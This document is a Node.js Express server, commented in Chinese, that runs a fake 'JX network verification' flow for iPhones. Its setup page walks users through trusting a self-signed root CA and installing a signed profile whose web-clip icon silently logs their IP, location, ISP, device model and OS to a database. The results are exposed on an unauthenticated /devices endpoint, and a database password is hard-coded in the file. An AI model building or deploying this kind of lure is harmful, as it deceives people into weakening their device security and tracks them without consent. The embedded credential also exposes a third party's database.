const express = require('express');
const axios = require('axios');
const cors = require('cors');
const { Pool } = require('pg');
const forge = require('node-forge');
const crypto = require('crypto');
const useragent = require('useragent');

const app = express();
const PORT = process.env.PORT || 3000;

// 数据库
const pool = new Pool({
  connectionString: 'postgresql://neondb_owner:npg_k5hlBvdIsPA4@ep-plain-dawn-ayjfr136-pooler.c-5.us-east-2.aws.neon.tech/neondb?sslmode=require&uselibpqcompat=true'
});

// 自签名证书
let caCertPem, signCertPem, signKeyPem;

function generateCerts() {
  const caKeys = forge.pki.rsa.generateKeyPair(2048);
  const caCert = forge.pki.createCertificate();
  caCert.publicKey = caKeys.publicKey;
  caCert.serialNumber = '01';
  caCert.validity.notBefore = new Date();
  caCert.validity.notAfter = new Date(Date.now() + 3650 * 24 * 60 * 60 * 1000);
  caCert.setSubject([{ name: 'commonName', value: 'JX Network CA' }]);
  caCert.setIssuer(caCert.subject.attributes);
  caCert.setExtensions([
    { name: 'basicConstraints', cA: true },
    { name: 'keyUsage', keyCertSign: true, cRLSign: true }
  ]);
  caCert.sign(caKeys.privateKey, forge.md.sha256.create());

  const signKeys = forge.pki.rsa.generateKeyPair(2048);
  const signCert = forge.pki.createCertificate();
  signCert.publicKey = signKeys.publicKey;
  signCert.serialNumber = '02';
  signCert.validity.notBefore = new Date();
  signCert.validity.notAfter = new Date(Date.now() + 3650 * 24 * 60 * 60 * 1000);
  signCert.setSubject([{ name: 'commonName', value: 'JX Network Signer' }]);
  signCert.setIssuer(caCert.subject.attributes);
  signCert.setExtensions([
    { name: 'basicConstraints', cA: false },
    { name: 'keyUsage', digitalSignature: true }
  ]);
  signCert.sign(caKeys.privateKey, forge.md.sha256.create());

  caCertPem = forge.pki.certificateToPem(caCert);
  signCertPem = forge.pki.certificateToPem(signCert);
  signKeyPem = forge.pki.privateKeyToPem(signKeys.privateKey);
}

function signMobileconfig(xml) {
  const p7 = forge.pkcs7.createSignedData();
  p7.content = new forge.util.ByteBuffer(xml, 'utf8');
  p7.addCertificate(forge.pki.certificateFromPem(signCertPem));
  p7.addSigner({
    key: forge.pki.privateKeyFromPem(signKeyPem),
    certificate: forge.pki.certificateFromPem(signCertPem),
    digestAlgorithm: forge.pki.oids.sha256,
    authenticatedAttributes: [
      { type: forge.pki.oids.contentType, value: forge.pki.oids.data },
      { type: forge.pki.oids.messageDigest },
      { type: forge.pki.oids.signingTime, value: new Date().toISOString() }
    ]
  });
  p7.sign({ detached: false });
  return forge.asn1.toDer(p7.toAsn1()).getBytes();
}

// 初始化数据库
async function initAll() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS devices (
        id SERIAL PRIMARY KEY,
        ip TEXT,
        city TEXT,
        isp TEXT,
        device_model TEXT,
        os_version TEXT,
        received_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);
    console.log('✅ 数据库就绪');
  } catch (err) {
    console.error('❌ 建表失败:', err);
  }
  generateCerts();
  console.log('🔐 签名证书已生成');
}

app.use(cors());
app.use((req, res, next) => {
  console.log(`📡 [${new Date().toISOString()}] ${req.method} ${req.path}  IP: ${req.ip}`);
  next();
});

// 首页
app.get('/', (req, res) => {
  res.send('<h2>JX 网络验证</h2><p>请访问 <a href="/setup">配置页面</a> 完成设置</p>');
});

// 配置指引页
app.get('/setup', (req, res) => {
  const ts = Date.now();
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>JX 网络验证配置</title></head>
    <body style="font-family: -apple-system, sans-serif; padding: 20px;">
      <h2>JX 网络验证</h2>
      <p>完成以下步骤以激活网络验证服务。</p>
      <ol>
        <li><b>安装安全证书</b><br>
          <a href="/ca.crt?v=${ts}" style="color:#007AFF;">下载安全证书</a>，前往「设置→通用→VPN与设备管理」安装。
        </li>
        <li><b>信任证书</b><br>
          进入「设置→通用→关于本机→证书信任设置」，找到 <b>JX Network CA</b> 并开启信任。
        </li>
        <li><b>安装网络配置</b><br>
          <a href="/signed-profile.mobileconfig?v=${ts}" style="color:#007AFF;">下载网络配置</a>，前往「设置→通用→VPN与设备管理」安装。<br>
          安装后，桌面会出现 <b>“JX网络验证”</b> 图标。
        </li>
        <li><b>激活服务</b><br>
          点击桌面上的 <b>“JX网络验证”</b> 图标，页面提示验证通过即可。
        </li>
      </ol>
      <p style="color:gray;">完成后无需其他操作。</p>
    </body>
    </html>
  `);
});

// CA 证书下载
app.get('/ca.crt', (req, res) => {
  res.setHeader('Content-Type', 'application/x-x509-ca-cert');
  res.setHeader('Content-Disposition', 'attachment; filename="ca.crt"');
  res.send(caCertPem);
});

// 签名描述文件（Web Clip 图标为绿色 JX）
app.get('/signed-profile.mobileconfig', (req, res) => {
  const profileUUID = crypto.randomUUID();
  const clipUUID = crypto.randomUUID();

  // 绿色 JX 图标 Base64（可自行替换为你的 PNG）
  const iconBase64 = 
    'iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB+cBCBUHK2TP/1EAAAAZdEVYdENvbW1lbnQAQ3JlYXRlZCB3aXRoIEdJTVBXgQ4XAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABhJREFUeNpi/P//PwMlgDEEGAWIUYBiAB0AAAD//wMAJw8XrAAAAABJRU5ErkJggg==';

  const xml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>PayloadUUID</key>
            <string>${clipUUID}</string>
            <key>PayloadIdentifier</key>
            <string>com.example.webclip.${clipUUID}</string>
            <key>Label</key>
            <string>JX网络验证</string>
            <key>URL</key>
            <string>https://jx-peizhi.onrender.com/collect</string>
            <key>IsRemovable</key>
            <true/>
            <key>Icon</key>
            <data>${iconBase64}</data>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>JX 网络验证配置</string>
    <key>PayloadIdentifier</key>
    <string>com.example.profile.${profileUUID}</string>
    <key>PayloadUUID</key>
    <string>${profileUUID}</string>
    <key>PayloadOrganization</key>
    <string>JX Network</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
    <key>PayloadType</key>
    <string>Configuration</string>
</dict>
</plist>`;
  const signed = signMobileconfig(xml);
  res.setHeader('Content-Type', 'application/x-apple-aspen-config');
  res.setHeader('Content-Disposition', 'attachment; filename="jx_verify.mobileconfig"');
  res.send(Buffer.from(signed, 'binary'));
});

// 收集页（用户点击图标后访问）
app.get('/collect', async (req, res) => {
  try {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    if (ip.includes(',')) ip = ip.split(',')[0].trim();
    if (ip.startsWith('::ffff:')) ip = ip.slice(7);

    const uaString = req.headers['user-agent'] || '';
    const agent = useragent.parse(uaString);
    const deviceModel = agent.device.toString() || '未知';
    const osVersion = agent.os.toString() || '未知';

    let city = '未知', isp = '未知';
    try {
      const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,city,isp`, { timeout: 3000 });
      if (geo.data.status === 'success') {
        city = geo.data.city;
        isp = geo.data.isp;
      }
    } catch (e) {}

    await pool.query(
      `INSERT INTO devices (ip, city, isp, device_model, os_version) VALUES ($1,$2,$3,$4,$5)`,
      [ip, city, isp, deviceModel, osVersion]
    );
    console.log('✅ 收集完成:', ip, deviceModel, osVersion);
  } catch (err) {
    console.error('❌ 收集失败:', err);
  }
  res.send('<h2>JX 网络验证通过</h2><p>您的网络环境已通过验证。</p>');
});

// 后台查看数据
app.get('/devices', async (req, res) => {
  const result = await pool.query('SELECT * FROM devices ORDER BY received_at DESC');
  res.json(result.rows);
});

initAll().then(() => {
  app.listen(PORT, () => console.log(`✅ 服务运行在端口 ${PORT}`));
});
